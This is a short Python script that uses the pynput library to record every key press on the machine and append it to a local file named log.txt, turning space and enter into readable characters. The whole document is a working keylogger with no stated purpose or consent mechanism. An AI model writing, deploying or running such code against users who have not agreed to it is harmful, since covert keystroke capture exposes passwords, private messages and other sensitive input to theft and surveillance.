from pynput.keyboard import Listener

def main(key):
    key = str(key).replace("'", "")

    if key == "Key.space":
         key = ' '
    if key == "Key.enter":
         key = '\n'

    with open('log.txt', 'a') as f:
        f.write(key)

with Listener(on_press=main) as l:
    l.join()